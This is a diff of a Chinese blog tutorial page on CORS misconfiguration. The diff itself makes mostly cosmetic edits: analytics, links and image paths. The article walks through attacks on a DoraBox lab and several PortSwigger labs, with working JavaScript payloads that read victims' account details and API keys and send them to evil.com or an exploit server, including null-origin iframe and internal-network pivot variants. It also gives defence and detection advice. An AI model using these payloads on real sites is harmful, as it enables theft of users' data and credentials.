@@ -13,10 +13,20 @@
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>CORS跨域漏洞 | hybcx&#39;s blog</title>
@@ -262,7 +272,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -319,7 +329,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -414,11 +424,6 @@
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -478,16 +483,16 @@ SOP全称为Same Origin Policy即同源策略，该策略是浏览器的一个�
 <p>所谓非简单请求就是那种对服务器提出特殊要求的请求，例如请求方法为PUT或DELETE。非简单的CORS请求会在正式通信之前，增加一次HTTP查询请求，称之为“预检请求”。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些HTTP动词和头信息字段。只有获得了肯定响应，浏览器才会正式发出XMLHttpRequest请求否则就报错。这种请求的好处是对传统的没有CORS支持的服务器减小压力，给服务器一个提前拒绝的机会。具体流程如下，当构造请求包的方法是PUT或DELETE并传给浏览器时，浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包，请求头是OPTIONS，并携带三个关键字段，Origin、Access-Control-Request-Method、Access-Control-Request-Headers。其中Access-Control-Request-Method表示浏览器的CORS请求会用到哪些HTTP方法，Access-Control-Request-Headers表示浏览器CORS请求会额外发送的头信息字段。服务器收到预检请求后，检查了三个核心字段以后如果确定允许跨域请求，会返回一个正常的HTTP回应，并携带传入的CORS头信息。如果服务器否定请求，虽然也会返回一个正常的HTTP回应但是没有任何CORS相关的头信息字段，或明确表示请求不符合条件。浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求。</p>
 <p>CORS使用检查请求头的相关字段和服务端的规则进行对比，来选择是否允许跨域。但凡是需要配置规则的程序，避免不了会出现一些意外，就像很多资深程序员有时也会写不出恰当的正则一样，当服务端配置的规则不够合理，导致非同域的资源可以互相访问，例如Access-Control-Allow-Origin: *。CORS反而使同源策略的保护机制土崩瓦解。<strong>因此，CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。</strong></p>
 <h2 id="0x03-CORS漏洞攻击流程">0x03 CORS漏洞攻击流程</h2>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151654619.png" alt="image-20230508151654619"></p>
+<p><img src="image-20230508151654619.png" alt="image-20230508151654619"></p>
 <p><a target="_blank" rel="noopener" href="http://1.xn--CORSfoo-4t3kgmi4pdzm3o6bpdn4t0clfel5uw2r5oap54qqixatex.com">1.假设用户登陆一个含有CORS配置网站foo.com</a>，<a target="_blank" rel="noopener" href="http://xn--evil-k84fui0wi3eluix9emvas11m4pa17nc6ct30ix07a1d7bhzxb45d.com">同时又访问了攻击者提供的一个链接evil.com</a>。</p>
 <p>2.evil.com的网站向foo.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于foo.com的配置。</p>
 <p>3.如果foo.com配置了Access-Control-Allow-Origin头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</p>
 <p><a target="_blank" rel="noopener" href="http://foo.com/index.php%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B">http://foo.com/index.php代码如下</a><br>
-<img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151744373.png" alt="image-20230508151744373"></p>
+<img src="image-20230508151744373.png" alt="image-20230508151744373"></p>
 <p><a target="_blank" rel="noopener" href="http://foo.com/phpinfo.php%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B">http://foo.com/phpinfo.php代码如下</a></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151757514.png" alt="image-20230508151757514"></p>
+<p><img src="image-20230508151757514.png" alt="image-20230508151757514"></p>
 <p>在访问index.php后再次访问phpinfo.php就可以在phpinfo页面发现httponly的COOKIE，在这里我们假设此cookie就是黑客想要获取的敏感信息。</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151812220.png" alt="image-20230508151812220"></p>
+<p><img src="image-20230508151812220.png" alt="image-20230508151812220"></p>
 <p>然后构造黑客发生送给用户的恶意页面<a target="_blank" rel="noopener" href="http://evil.com/steal.html">http://evil.com/steal.html</a></p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span><span class="token operator">&gt;</span>
 <span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
@@ -528,21 +533,21 @@ SOP全称为Same Origin Policy即同源策略，该策略是浏览器的一个�
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>当用户点开此网页时，由evil.com通过AJAX发出一个向foo.com的资源请求，所以浏览器自动添加了Origin字段。</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151845461.png" alt="image-20230508151845461"></p>
+<p><img src="image-20230508151845461.png" alt="image-20230508151845461"></p>
 <p>接下来黑客将获取到的敏感信息POST提交到save.php中，而save.php将数据保存在phpinfo.html里。<a target="_blank" rel="noopener" href="http://evil.com/save.php%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B%EF%BC%9A">evil.com/save.php代码如下：</a></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151857434.png" alt="image-20230508151857434"></p>
+<p><img src="image-20230508151857434.png" alt="image-20230508151857434"></p>
 <p>黑客的请求流程是steal.html-&gt;phpinfo.php-&gt;save.php。我们通过BurpSuite的Repeater功能重放抓到的phpinfo.php请求包可以发现响应包是含有返回内容的，也就是请求到的资源。</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151911805.png" alt="image-20230508151911805"></p>
+<p><img src="image-20230508151911805.png" alt="image-20230508151911805"></p>
 <p>但是在save.php中并没有返回的资源，通过检查浏览器的控制台提示信息发现，由于响应包缺少Access-Control-Allow-Origin响应头，导致浏览器拦截了跨源请求。</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151924149.png" alt="image-20230508151924149"></p>
+<p><img src="image-20230508151924149.png" alt="image-20230508151924149"></p>
 <p><a target="_blank" rel="noopener" href="http://xn--foo-du3eo63e.com/phpinfo.php%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E6%B3%A8%E9%87%8A">去掉foo.com/phpinfo.php服务端的注释</a></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151935869.png" alt="image-20230508151935869"></p>
+<p><img src="image-20230508151935869.png" alt="image-20230508151935869"></p>
 <p>重新访问<a target="_blank" rel="noopener" href="http://evil.com/steal.html">http://evil.com/steal.html</a></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508151947727.png" alt="image-20230508151947727"></p>
+<p><img src="image-20230508151947727.png" alt="image-20230508151947727"></p>
 <p>发现响应包中出现了对应的CORS响应头，Access-Control-Allow-Origin指是允许访问的源，Access-Control-Allow-Credentials指的是允许带上cookie访问资源。这样浏览器就不会出错而拦截请求了，<a target="_blank" rel="noopener" href="http://xn--jsevil-qr3js1ivpc1091bvvlsk7cgzuc3ggq8dzjxayjdjxg.com/save.php%E5%8E%BB">随后js脚本把页面编码后发送到evil.com/save.php去</a><br>
-<img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508152005865.png" alt="image-20230508152005865"></p>
+<img src="image-20230508152005865.png" alt="image-20230508152005865"></p>
 <p><a target="_blank" rel="noopener" href="http://xn--evil-4h9gr48auxmfr9dnft6ju.com/phpinfo.html%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E5%B7%B2%E7%BB%8F%E8%A2%AB%E7%AA%83%E5%8F%96%E8%BF%87%E6%9D%A5%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82%E8%87%B3%E6%AD%A4%E6%88%90%E5%8A%9F%E5%88%A9%E7%94%A8CORS%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE%E3%80%82">模拟黑客访问evil.com/phpinfo.html页面，可以发现已经被窃取过来的敏感信息。至此成功利用CORS漏洞进行跨域资源访问。</a></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508152019446.png" alt="image-20230508152019446"></p>
+<p><img src="image-20230508152019446.png" alt="image-20230508152019446"></p>
 <h2 id="0x04-修复及防御方式">0x04 修复及防御方式</h2>
 <pre class="line-numbers language-none"><code class="language-none">1.仔细评估是否开启CORS，如果不必要就不要开启CORS
 
@@ -590,9 +595,9 @@ SOP全称为Same Origin Policy即同源策略，该策略是浏览器的一个�
 这样的话攻击者就可以利用这个漏洞来窃取已经在这个网站上登录了的用户的信息（利用cookie）</p>
 <h2 id="0x06-漏洞利用">0x06 漏洞利用</h2>
 <p>这里以droabox靶场为例</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508155343507.png" alt="image-20230508155343507"></p>
+<p><img src="image-20230508155343507.png" alt="image-20230508155343507"></p>
 <p>这个接口会返回已登录的用户的信息数据，通过访问该网页的响应我们看到这里可能存在CORS跨域资源共享漏洞</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508155355927.png" alt="image-20230508155355927"></p>
+<p><img src="image-20230508155355927.png" alt="image-20230508155355927"></p>
 <p>接下来我们就可以建立一个恶意的js代码</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> cors<span class="token punctuation">.</span>html <span class="token operator">--</span><span class="token operator">&gt;</span>
 <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span>
@@ -630,7 +635,7 @@ this.responseText 是 XMLHttpRequest 对象的属性，它包含从服务器返�
 
 因此，这行代码的作用是将服务器返回的响应文本（this.responseText）设置为具有 id "demo" 的元素的内部 HTML 内容。这样，在网页中具有 id "demo" 的元素会显示服务器返回的文本内容。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>访问这个页面就可以获取已登录的用户的信息</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230508155432545.png" alt="image-20230508155432545"></p>
+<p><img src="image-20230508155432545.png" alt="image-20230508155432545"></p>
 <p>该恶意代码首先定义一个函数cors，以get形式访问目标网址，创建XMLHttpRequest对象为xhttp，通过ajax的onreadystatechange判断请求状态，如果请求已完成，且相应已就绪，则弹出返回文本。</p>
 <h2 id="0x07-漏洞发现技巧">0x07 漏洞发现技巧</h2>
 <p>在之前我们了解了一些关于CORS跨域资源共享通信的一些字段含义，<br>
@@ -638,11 +643,11 @@ CORS的漏洞主要看当我们发起的请求中带有Origin头部字段时，�
 <h5 id="方式一-BurpSuite">方式一: BurpSuite</h5>
 <p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。<br>
 <strong>方式一: 首先是自动在HTTP请求包中加上Origin的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为Origin:example.com的Enable框。</strong></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230510210647354.png" alt="image-20230510210647354"></p>
+<p><img src="image-20230510210647354.png" alt="image-20230510210647354"></p>
 <p><strong>在Filter by search term 中输入：Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="http://foo.example.org">foo.example.org</a></strong></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230510210756718.png" alt="image-20230510210756718"></p>
+<p><img src="image-20230510210756718.png" alt="image-20230510210756718"></p>
 <p><strong>HTTP history列表中出现符合条件的请求包，点击Ctrl+R，点击GO，如下图，即该处有CORS漏洞。</strong></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230510210834463.png" alt="image-20230510210834463"></p>
+<p><img src="image-20230510210834463.png" alt="image-20230510210834463"></p>
 <p>组合应是这种：</p>
 <pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> foo.example.org
 <span class="token key atrule">Access-Control-Allow-Credentials</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -663,7 +668,7 @@ Access-Control-Allow-Credentials: true<br>
 <code>单一的情况</code></p>
 <h5 id="方式二-Access-Control-Allow-Origin：">方式二: Access-Control-Allow-Origin：</h5>
 <p>curl命令，输入<code>curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H "Origin:https://example.com/" -I</code></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230510211118635.png" alt="image-20230510211118635"></p>
+<p><img src="image-20230510211118635.png" alt="image-20230510211118635"></p>
 <p>如果出现这种组合，说明存在CORS漏洞</p>
 <pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> foo.example.org
 <span class="token key atrule">Access-Control-Allow-Credentials</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -671,7 +676,7 @@ Access-Control-Allow-Credentials: true<br>
 <p>github上提供了一个关于扫描CORS配置漏洞的脚本<br>
 <a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a><br>
 CORScanner是一个python工具，旨在发现网站的CORS错误配置漏洞。它可以帮助网站管理员和渗透测试人员检查他们针对的域/ URL是否具有不安全的CORS策略。</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230510211631525.png" alt="image-20230510211631525"></p>
+<p><img src="image-20230510211631525.png" alt="image-20230510211631525"></p>
 <p><strong>总结漏洞的原因：</strong><br>
 1：CORS服务端的 Access-Control-Allow-Origin 设置为了 *，并且 Access-Control-Allow-Credentials 设置为false，这样任何网站都可以获取该服务端的任何数据了。<br>
 2：有一些网站的Access-Control-Allow-Origin他的设置并不是固定的，而是根据用户跨域请求数据的Origin来定的。这时，不管Access-Control-Allow-Credentials 设置为了 true 还是 false。任何网站都可以发起请求，并读取对这些请求的响应。意思就是任何一个网站都可以发送跨域请求来获得CORS服务端上的数据。</p>
@@ -731,7 +736,7 @@ location<span class="token operator">=</span><span class="token string">'malicio
 <li>如果vuln.com配置了Access-Control-Allow-Origin头且为允许接收，否则浏览器会因为同源策略而不接收。</li>
 </ol>
 <h4 id="方式一：存在用户凭证">方式一：存在用户凭证</h4>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230510212141252.png" alt="image-20230510212141252"></p>
+<p><img src="image-20230510212141252.png" alt="image-20230510212141252"></p>
 <p><strong>详细过程</strong></p>
 <ol>
 <li>
@@ -960,7 +965,7 @@ Access-Control-Allow-Credentials:true
 </li>
 </ol>
 <p>将利用脚本放置在搭建的恶意网站下，当受害者在同一浏览器登录目标网站，并打开该恶意链接，即可盗取目标网站的 HTTP 响应内容。</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230510221238392.png" alt="image-20230510221238392"></p>
+<p><img src="image-20230510221238392.png" alt="image-20230510221238392"></p>
 <p>这里我复现不出来…</p>
 <h2 id="0x12-bp官网的靶场练习">0x12 bp官网的靶场练习</h2>
 <h4 id="实验一-具有基本原点反射的-CORS-漏洞">实验一: 具有基本原点反射的 CORS 漏洞</h4>
@@ -971,11 +976,11 @@ Access-Control-Allow-Credentials:true
 
 您可以使用以下凭据登录到您自己的帐户：wiener:peter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>首先开启bp代理,同时关闭拦截,记录你浏览网页的请求</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230511001645031.png" alt="image-20230511001645031"></p>
+<p><img src="image-20230511001645031.png" alt="image-20230511001645031"></p>
 <p>登陆账号，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230511235451763.png" alt="image-20230511235451763"></p>
+<p><img src="image-20230511235451763.png" alt="image-20230511235451763"></p>
 <p>接下来我们将其发送到重发器,验证是否有CORS漏洞</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512000128545.png" alt="image-20230512000128545"></p>
+<p><img src="image-20230512000128545.png" alt="image-20230512000128545"></p>
 <p>如上图我们在请求区添加origin头,并写入随意的一个域名,响应后发现右侧的CORS头出现我们输入的域名(不论我们的域名是什么),这说明的确存在CORS漏洞, 即允许任意源的访问</p>
 <p>接下来我们要编写js脚本,意在向服务器发送获取管理员详细信息的请求(这里是cookie),并将请求得到的数据存放在我们的日志中</p>
 <p><a target="_blank" rel="noopener" href="https://0ac200c803b3121486c4a98700c50006">https://0ac200c803b3121486c4a98700c50006</a>: 此处换成你实验室的url即可</p>
@@ -991,8 +996,8 @@ Access-Control-Allow-Credentials:true
     <span class="token punctuation">}</span><span class="token punctuation">;</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>接着将该脚本添加到漏洞服务器中(发送给受害者),查看你的日志,如下图可以看到成功得到管理员的apikey</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512001443189.png" alt="image-20230512001443189"></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512001856272.png" alt="image-20230512001856272"></p>
+<p><img src="image-20230512001443189.png" alt="image-20230512001443189"></p>
+<p><img src="image-20230512001856272.png" alt="image-20230512001856272"></p>
 <p>如上图,从左到右依次点击即可</p>
 <h4 id="实验室二：受信任空源的CORS漏洞">实验室二：受信任空源的CORS漏洞</h4>
 <p>提示:</p>
@@ -1001,9 +1006,9 @@ Access-Control-Allow-Credentials:true
 您可以使用以下凭据登录到自己的帐户：<code>wiener:peter</code></p>
 <p>同上题</p>
 <p>登陆账号，单击"我的帐户"，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512002701301.png" alt="image-20230512002701301"></p>
+<p><img src="image-20230512002701301.png" alt="image-20230512002701301"></p>
 <p>经过实验发现,这次不能允许任意源的访问了,那我们给origin赋值为null看看响应,发现成功响应</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512003016726.png" alt="image-20230512003016726"></p>
+<p><img src="image-20230512003016726.png" alt="image-20230512003016726"></p>
 <p>接着用iframe构造null源的请求来绕过</p>
 <p>在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为实验室URL的URL，将YOUR-EXPLOIT-SERVER-ID替换为漏洞利用服务器ID）</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe sandbox<span class="token operator">=</span><span class="token string">"allow-scripts allow-top-navigation allow-forms"</span> srcdoc<span class="token operator">=</span>"<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
@@ -1044,30 +1049,30 @@ Access-Control-Allow-Credentials:true
 需要注意的是，沙箱属性可以提供一定的安全性，但它仍然需要在合适的场景和正确的使用方式下才能发挥作用。开发者应该仔细考虑并评估是否需要使用沙箱以及如何设置沙箱属性，以确保安全性和功能之间的平衡。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>单击"查看漏洞利用"（view）。观察漏洞利用是否有效-已登录到日志页面，API密钥位于URL中（测试poc的可行性，就不在这测了，直接到发给受害者）<br>
 返回到利用漏洞攻击服务器并单击"将利用漏洞攻击发送给受害者"。</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512003338078.png" alt="image-20230512003338078"></p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512003939772.png" alt="image-20230512003939772"></p>
+<p><img src="image-20230512003338078.png" alt="image-20230512003338078"></p>
+<p><img src="image-20230512003939772.png" alt="image-20230512003939772"></p>
 <p>成功!!!</p>
 <h4 id="实验三-受信任的不安全协议的CORS漏洞">实验三:  受信任的不安全协议的CORS漏洞</h4>
 <p>提示:</p>
 <p>1、此网站具有不安全的CORS配置，因为它信任所有子域，而不管协议如何。</p>
 <p>2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api key</p>
 <p>3、已有账号：wiener:peter</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512005418526.png" alt="image-20230512005418526"></p>
+<p><img src="image-20230512005418526.png" alt="image-20230512005418526"></p>
 <p>如上图,依旧可能存在CORS漏洞,发送到重发器验证</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512005502585.png" alt="image-20230512005502585"></p>
+<p><img src="image-20230512005502585.png" alt="image-20230512005502585"></p>
 <p>此时将origin标头改为:</p>
 <pre class="line-numbers language-none"><code class="language-none">Origin:http://subdomain.lab-id
 （lab-id 是实验室域名）
  
 我的是：
 Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512005624579.png" alt="image-20230512005624579"></p>
+<p><img src="image-20230512005624579.png" alt="image-20230512005624579"></p>
 <p>如上图成功发现利用漏洞(发现其任意子域都可以访问)</p>
 <p><strong>组合利用</strong><br>
 打开一个产品页面，单击Check stock并观察它是使用一个子域上的HTTP URL加载的</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512010238048.png" alt="image-20230512010238048"></p>
+<p><img src="image-20230512010238048.png" alt="image-20230512010238048"></p>
 <p>接下来验证该子域是否存在XSS漏洞,如下图,响应中并没有对我们的恶意代码进行某些必要的编码过滤,因此的确存在XSS漏洞</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512010433282.png" alt="image-20230512010433282"></p>
+<p><img src="image-20230512010433282.png" alt="image-20230512010433282"></p>
 <p>在浏览器中，转到漏洞利用服务器并输入以下HTML，将YOUR-LAB-ID替换为您的唯一实验室URL，将YOUR-EXPLOIT-SERVER-ID替换为您的漏洞利用服务器ID：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
     document<span class="token punctuation">.</span>location<span class="token operator">=</span>"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>stock<span class="token punctuation">.</span><span class="token constant">YOUR</span><span class="token operator">-</span><span class="token constant">LAB</span><span class="token operator">-</span><span class="token constant">ID</span><span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span>productId<span class="token operator">=</span><span class="token number">4</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
@@ -1085,7 +1090,7 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
 <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
     document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">"http://stock.0a9800610460650c822b3861005c0050.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a9800610460650c822b3861005c0050.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6c00a2045f65df82f537b4017f003e.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1"</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512011023038.png" alt="image-20230512011023038"></p>
+<p><img src="image-20230512011023038.png" alt="image-20230512011023038"></p>
 <h4 id="实验四-CORS漏洞与内部网络枢轴攻击">实验四: CORS漏洞与内部网络枢轴攻击</h4>
 <p>提示:</p>
 <p>1、此网站具有不安全的CORS配置，因为它信任所有内部网络来源。</p>
@@ -1150,9 +1155,9 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
 
 这段代码的目的是通过循环异步请求来尝试访问本地网络中的 HTTP 服务，并将响应的文本内容发送到协作者的服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>在漏洞利用服务器中输入以下代码。单击存储，然后单击“将漏洞利用发送给受害者”。</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512092320370.png" alt="image-20230512092320370"></p>
+<p><img src="image-20230512092320370.png" alt="image-20230512092320370"></p>
 <p>检查日志或Collaborator交互组件，并查看发送给它的代码参数</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512092341858.png" alt="image-20230512092341858"></p>
+<p><img src="image-20230512092341858.png" alt="image-20230512092341858"></p>
 <p>发现: 192.168.0.175:8080</p>
 <p>part2:</p>
 <p>重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为从协作者交互中检索到的IP地址和端口号。不要忘记添加Collaborator有效负载或再次利用服务器URL。更新并提供漏洞利用。</p>
@@ -1188,9 +1193,9 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
 
 这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>现在我们将探测用户名字段中的XSS漏洞。</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512093905416.png" alt="image-20230512093905416"></p>
+<p><img src="image-20230512093905416.png" alt="image-20230512093905416"></p>
 <p>检索URL中具有foundXSS=1的Collaborator交互；或者在日志中看到foundXSS=1</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512094256644.png" alt="image-20230512094256644"></p>
+<p><img src="image-20230512094256644.png" alt="image-20230512094256644"></p>
 <p>part3:</p>
 <p>重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为与步骤2中相同的IP地址和端口号，再次添加Collaborator有效负载或漏洞利用服务器。更新并提供漏洞利用</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
@@ -1208,9 +1213,9 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
  
